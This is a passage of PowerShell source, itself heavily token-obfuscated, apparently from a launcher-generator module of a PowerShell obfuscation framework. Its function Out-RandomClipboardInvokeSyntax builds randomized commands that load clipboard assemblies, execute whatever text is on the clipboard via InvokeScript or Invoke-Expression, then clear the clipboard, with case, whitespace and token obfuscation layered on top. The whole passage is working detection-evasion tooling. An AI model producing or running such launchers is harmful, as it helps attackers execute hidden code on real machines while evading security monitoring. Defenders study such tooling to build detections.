    If(${P`ow`E`RsHELLSTdin} -ne '-')
    {
        
        ${inVokeOP`Ti`oN} = &("{4}{5}{6}{0}{3}{1}{2}"-f'k','Comma','nd','en','Out-Obf','uscatedT','o') -ScriptBlock ( (  IteM VArIAbLE:jT0g).VaLue::("{1}{0}{2}"-f'at','Cre','e').Invoke(${I`NVokEoPtI`on}))
        ${InV`OKE`OPTIOn} = &("{0}{3}{1}{6}{5}{2}{4}"-f 'O','Obfus','nComm','ut-','and','tedToke','ca') -ScriptBlock (  ${j`T0G}::("{1}{0}"-f'e','Creat').Invoke(${I`NVo`K`Eo`ptioN})) ("{0}{1}{4}{3}{2}"-f 'Rand','o','hitespace','W','m') 1
    }
    
    
    ForEach(${C`har} in @('<','>','|','&'))
    {
        
        If(${PO`WER`sHeL`l`stdin}.("{0}{1}"-f 'Co','ntains').Invoke("$Char")) 
        {
            ${pOweRS`hEllSt`D`iN} = ${P`oWeRs`hE`LlST`diN}.("{2}{1}{0}"-f'ace','l','Rep').Invoke("$Char","^$Char")
        }
    }
    
    
    If(${pOW`Er`s`HELlS`TDIn}.("{2}{0}{1}"-f'ntain','s','Co').Invoke('"'))
    {
        ${pOWe`R`sheL`l`stdIN} = ${poWE`RSH`ElLsTD`in}.("{0}{1}"-f 'Re','place').Invoke('"','\"')
    }

    Return ${P`Ow`Er`SHELL`StDin}
}


Function Ou`T-R`ANdOM`c`lipbOARDi`NvOKeSY`NTAX
{


    
    ${Ref`le`cTI`ONASS`EMbly}    = &("{0}{2}{1}"-f'Ge','Random','t-') -Input @(("{3}{1}{2}{4}{0}{7}{5}{6}" -f'efle','ste','m','Sy','.R','e','mbly','ction.Ass'),("{1}{4}{2}{3}{0}"-f'mbly','Reflectio','ss','e','n.A'))
    ${wInD`owsc`LI`pbOaRd}      = &("{2}{1}{0}" -f'om','et-Rand','G') -Input @(("{1}{0}{2}{3}"-f'oa','Windows.Clipb','r','d'),("{0}{3}{1}{6}{2}{4}{5}" -f'System.','indo','p','W','boa','rd','ws.Cli'))
    ${W`iNdOw`SFOR`mScl`iPBOArd} = &("{2}{0}{1}"-f'o','m','Get-Rand') -Input @(("{2}{1}{5}{6}{3}{0}{4}{7}" -f'Forms.C','ystem.','S','ndows.','lip','W','i','board'),("{4}{0}{2}{3}{1}"-f 'd','Clipboard','ow','s.Forms.','Win'))
    
    
    ${fUL`l`Argu`mENT} = ("{3}{2}{1}{0}" -f'me','Na','mbly','-Asse')
    
    ${AS`sEMbl`YNa`meF`LA`gS} = @()
    ${a`SS`EmB`LyN`AMeFlAgs} += '-AN'
    For(${I`ND`EX}=2; ${I`NdeX} -le ${f`U`llar`GuM`enT}."le`N`gth"; ${INd`ex}++)
    {
        ${asseMblyN`AM`efl`A`gS} += ${fuLla`Rgu`mEnT}.("{1}{0}{2}"-f 'in','SubStr','g').Invoke(0,${in`deX})
    }
    ${A`SsEmb`LYNa`mEflAg} = &("{1}{2}{3}{0}" -f 'ndom','Ge','t-R','a') -Input ${A`SseM`Bl`y`NamefLAGS}

    
    
    ${CHaRs`Tora`NDomvA`RnaMe}  = @(0..9)
    ${cHar`st`oRa`N`DoMVARn`Ame} += @('A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')

    
    ${rA`NDO`mV`A`RlENgtH} = (&("{2}{1}{0}" -f 'om','nd','Get-Ra') -Input @(3..6))
   
    
    If(${ChAR`Sto`RANdOmv`Arn`AMe}."co`Unt" -lt ${ranDom`V`ARLEnG`Th}) {${Ran`D`O`MVARlENgtH} = ${CHARStORA`NDo`m`Var`NaME}."co`UNT"}
    ${R`An`domv`AR`NAME} = ((&("{1}{0}{2}" -f 'et-Rando','G','m') -Input ${Ch`ARsto`RAnD`oMv`ArNaME} -Count ${rAND`OMV`ARleN`gtH}) -Join '').("{1}{0}"-f'e','Replac').Invoke(' ','')

    
    ${raNDO`MVA`Rn`AME} = ((&("{1}{2}{0}" -f'Random','G','et-') -Input ${cha`RstoRaN`dO`MvAR`NaMe} -Count ${rA`NdOmVA`Rl`eNg`TH}) -Join '').("{1}{0}{2}" -f 'epl','R','ace').Invoke(' ','')

    
    ${raNDO`m`cL`ips`YntAX`VALuE} = &("{1}{2}{0}"-f'dom','G','et-Ran') -Input @(1..3)
    Switch(${Ra`Nd`O`mC`LIPsYntaxv`A`lUe})
    {
        1 {
            ${Lo`A`DCli`p`BO`ARdCLassoPTi`oN}   = ('Ad'+'d-'+'Type '+"$AssemblyNameFlag "+'Presen'+'ta'+'t'+'ionCore')
            ${GeTC`lIpb`OArdco`NTe`NtSop`TI`oN} = "([$WindowsClipboard]::GetText())"
            ${c`lEA`RclIPbOaRDOP`Ti`On}       = "[$WindowsClipboard]::" + (&("{2}{0}{1}" -f't-Rand','om','Ge') -Input @(("{1}{0}" -f'()','Clear'),((("{4}{2}{1}{3}{0}"-f')','t(FAZ ','tTex','FAZ','Se'))."Repl`Ace"('FAZ',[STrINg][ChaR]39))))
        }
        2 {
            ${lO`AdcLI`Pb`oaR`DClaSsop`TIoN}   = ('Add-Ty'+'pe'+' '+"$AssemblyNameFlag "+'System'+'.'+'Windows.F'+'o'+'r'+'ms')
            ${Getcl`IP`B`oAr`dc`OntenTS`oPtiON} = "([$WindowsFormsClipboard]::GetText())"
            ${Cl`eAr`Cl`I`Pbo`ARDoP`TiON}       = "[$WindowsFormsClipboard]::" + (&("{2}{0}{1}" -f '-Rand','om','Get') -Input @(("{1}{2}{0}"-f '()','Cle','ar'),((("{4}{1}{0}{3}{2}" -f 'Hi','Text(His ',')','s','Set'))."re`PlAcE"(([CHar]72+[CHar]105+[CHar]115),[stRing][CHar]39))))
        }
        3 {
            ${LoaDCliPbo`ARdCla`SSO`PT`iON}   =  (&("{0}{1}{2}"-f 'G','et-Ran','dom') -Input @(("{1}{0}" -f 'd]','[Voi'),(('qiSN'+'ULL'+'=')."rep`LAcE"(([CHAR]113+[CHAR]105+[CHAR]83),'$')),"`$$RandomVarName=")) + "[$ReflectionAssembly]::LoadWithPartialName('System.Windows.Forms')"
            ${Ge`T`cLip`BOAr`D`C`ONte`Nt`SoPtiOn} = "([$WindowsFormsClipboard]::GetText())"
            ${clEaRcLi`pb`OArd`OP`TiOn}       = "[$WindowsFormsClipboard]::" + (&("{0}{2}{1}{3}" -f 'G','n','et-Ra','dom') -Input @(("{2}{0}{1}"-f'ar','()','Cle'),((("{4}{1}{2}{3}{0}" -f'{0})','e','tText','({0} ','S')) -f  [chAr]39)))
        }
        ("{1}{0}"-f'lt','defau') {&("{1}{0}{2}" -f'ro','Write-Er','r') ('An'+' '+'inv'+'al'+'id '+'Rand'+'omCl'+'i'+'pSyntaxValue '+'v'+'alue '+"($RandomClipSyntaxValue) "+'was'+' '+'pa'+'ss'+'ed '+'to'+' '+'sw'+'i'+'tch '+'b'+'lo'+'ck '+'fo'+'r '+'O'+'ut-RandomCli'+'pb'+'oardInv'+'okeSy'+'nta'+'x'+'.'); Exit;}
    }
    
    
    ${EXECCo`NTexTv`Ar`iabl`ES}  = @()
    ${e`XecCO`N`TEX`TvAriabLES} += '(' + (&("{1}{0}{2}"-f'R','Get-','andom') -Input @('DIR',("{3}{2}{4}{0}{1}" -f'hildIt','em','et','G','-C'),'GCI',("{0}{2}{1}"-f'ChildI','em','t'),'LS',("{2}{0}{1}"-f't-It','em','Ge'),'GI',("{1}{0}"-f'em','It'))) + ' ' + ((("{2}{0}{3}{1}{4}"-f 'v','e','RUA','ariabl',':'))."R`ePlA`CE"(([cHar]82+[cHar]85+[cHar]65),[STriNg][cHar]39)) + (&("{0}{2}{1}"-f'Get','om','-Rand') -Input @(("{1}{0}"-f'x*xt','e'),("{4}{2}{0}{1}{3}" -f'on','te','tionC','xt','Execu'))) + (((("{0}{1}"-f'{0}',').Value'))-f[ChaR]39))
    ${exeCcOnTExtVA`R`i`A`B`l`Es} += '(' + (&("{0}{2}{3}{1}" -f'G','andom','et','-R') -Input @(("{0}{1}{2}" -f'Get-Va','riab','le'),'GV',("{2}{1}{0}" -f'ble','ria','Va'))) + ' ' + "'" + (&("{0}{1}{3}{2}"-f 'Ge','t-','m','Rando') -Input @(("{1}{0}"-f 't','ex*x'),("{0}{1}{2}{3}"-f 'E','x','ecu','tionContext'))) + "'" + (&("{2}{1}{0}"-f 'andom','et-R','G') -Input (((("{0}{1}"-f').','Value'))),(' ' + (("{1}{0}{2}" -f'alue','-V','Only').("{0}{1}" -f'Su','bString').Invoke(0,(&("{1}{2}{0}"-f 'om','G','et-Rand') -Minimum 3 -Maximum (("{0}{2}{1}"-f'-','lueOnly','Va')."lEng`TH"+1)))) + ')')))
    
    ${E`X`ECCOn`TEx`TVAr`iAbLE} = &("{0}{1}{2}"-f'Get-Ra','n','dom') -Input ${ExEccoN`TeXtVA`RIa`B`lES}

    
    
    ${e`xpr`ESs`i`ONTo`iNVoKe} = ${GEtcLi`P`BO`AR`D`COntentsO`P`TION}
    If(&("{0}{2}{1}"-f'Get-Ran','m','do') -Input @(0..1))
    {
        
        ${InVoKe`op`TioN} = &("{5}{3}{8}{6}{1}{9}{2}{4}{0}{7}"-f 'pres','Encapsulated','oke','u','Ex','O','-','sion','t','Inv') ${e`x`pr`essiONToInVOKE}
    }
    Else
    {
        ${In`Vo`keOP`TI`On} = (&("{2}{1}{0}{3}"-f 'ndo','t-Ra','Ge','m') -Input @(((('Y'+'NzExecut'+'ion'+'Context')  -rEpLaCe ([ChAR]89+[ChAR]78+[ChAR]122),[ChAR]36)),'${ExecutionContext}',${ExEc`co`NT`ext`VaRIaBle})) + ((("{2}{4}{7}{5}{8}{3}{6}{0}{1}"-f'vokeScri','pt(','.','d.','InvokeC','mma','In','o','n'))) + ' '*(&("{1}{3}{2}{0}"-f 'm','Ge','ndo','t-Ra') -Minimum 0 -Maximum 3) + ${eXp`RE`S`SionT`oiNVOKe} + ' '*(&("{0}{3}{2}{1}"-f'Get','dom','n','-Ra') -Minimum 0 -Maximum 3) + ')'
    }

    
    ${I`N`VoK`EOPTion} = ([Char[]]${INvOkeo`PTI`oN}.("{0}{1}" -f 'ToLo','wer').Invoke() | &("{1}{0}{4}{3}{2}" -f'Ea','For','Object','h-','c') {${C`hAr} = ${_}; If(&("{2}{0}{1}" -f 'do','m','Get-Ran') -Input (0..1)){${ch`AR} = ${c`HaR}.("{2}{1}{0}" -f 'g','rin','ToSt').Invoke().("{0}{1}"-f'ToUppe','r').Invoke()} ${CH`AR}}) -Join ''

    
    ${P`o`weRsHEllcl`iP} = ${LOAdC`LIP`B`Oa`Rdcla`S`soptIon} + ' '*(&("{1}{0}{2}" -f'o','Get-Rand','m') -Minimum 0 -Maximum 3) + ';' + ' '*(&("{1}{2}{3}{0}" -f'dom','Get-','Ra','n') -Minimum 0 -Maximum 3) + ${invoKeo`p`T`I`oN}
    
    
    ${POW`e`R`shELLCLIP} = ${poWeRSh`e`llC`l`iP} + ' '*(&("{2}{1}{0}" -f'om','d','Get-Ran') -Minimum 0 -Maximum 3) + ';' + ' '*(&("{0}{3}{2}{1}"-f'Get','dom','an','-R') -Minimum 0 -Maximum 3) + ${ClearCliP`BoARd`OPt`i`oN}

    
    ${p`owE`R`Sh`EllcLiP} = &("{2}{0}{5}{1}{6}{4}{3}" -f '-Obfu','d','Out','enCommand','k','scate','To') -ScriptBlock ( ( VarIaBle  ("J"+"t0g") ).vAlue::("{0}{1}"-f'Crea','te').Invoke(${p`Ow`E`RShELLclip})) ("{0}{2}{1}" -f 'Memb','r','e')
    ${pOw`ER`sHE`lLC`lIP} = &("{3}{4}{0}{2}{1}"-f 'scat','nCommand','edToke','Ou','t-Obfu') -ScriptBlock (  (  VaRiaBle ("J"+"t0G")  -vA)::("{1}{0}" -f 'eate','Cr').Invoke(${P`oWeRShE`LL`c`liP})) ("{1}{0}"-f 'ember','M')
    ${pOWE`R`sHe`LLcL`IP} = &("{2}{3}{5}{1}{0}{4}"-f'omm','enC','Out-Obfuscat','edTo','and','k') -ScriptBlock (  ${J`T0g}::("{1}{0}" -f'e','Creat').Invoke(${PO`wER`ShElLcLIP})) ("{0}{1}"-f 'Comman','d')
    ${po`WErSHEl`l`Clip} = &("{3}{6}{4}{2}{0}{1}{5}"-f'k','enComm','edTo','O','Obfuscat','and','ut-') -ScriptBlock (  ( gET-vaRIABlE  JT0G  ).Value::("{1}{0}{2}"-f 'e','Cr','ate').Invoke(${PoWeRS`Hel`L`clIp})) ("{2}{3}{0}{1}"-f 'gume','nt','Command','Ar')
    ${POw`ERshelL`CliP} = &("{2}{3}{0}{1}{4}" -f'catedToken','Co','Out-Obf','us','mmand') -ScriptBlock ( ${jT0G}::("{1}{0}"-f 'reate','C').Invoke(${P`OWe`RS`heL`LClIp})) ("{0}{1}" -f 'Va','riable')
    ${P`ow`eRsH`ellc`LIP} = &("{3}{4}{2}{0}{1}" -f'omma','nd','scatedTokenC','Out-Obf','u') -ScriptBlock (  (variablE ("jT0"+"G") -VAlUeO  )::("{0}{1}" -f 'Cre','ate').Invoke(${p`oweR`ShElL`CLip})) ("{1}{2}{0}" -f 'ng','S','tri')
    ${P`oWeRshel`lc`Lip} = &("{0}{2}{1}{4}{6}{3}{5}" -f 'O','fusc','ut-Ob','C','atedToke','ommand','n') -ScriptBlock ( ( GEt-VArIAblE jt0G ).VAluE::("{0}{1}"-f'C','reate').Invoke(${Pow`E`Rs`hELLcLip})) ("{0}{1}{3}{2}{4}" -f 'R','an','mWhites','do','pace')
    
    
    ForEach(${cH`Ar} in @('<','>','|','&'))
    {
        
        If(${PowE`Rs`HElLCl`IP}.("{0}{1}"-f 'Conta','ins').Invoke("$Char")) 
        {
            ${POWer`S`h`ELlC`lIp} = ${pOW`E`RSh`el`lcliP}.("{0}{1}{2}" -f'Rep','lac','e').Invoke("$Char","^$Char")
        }
    }
    
    
    If(${pOW`eRSh`ElLC`l`ip}.("{1}{0}{2}" -f'a','Cont','ins').Invoke('"'))
    {
        ${po`wersHE`lLC`LIp} = ${POWeRsH`EL`lcLIP}.("{1}{2}{0}" -f'ce','Re','pla').Invoke('"','\"')
    }

    Return ${pO`werS`hELL`C`lip}
}
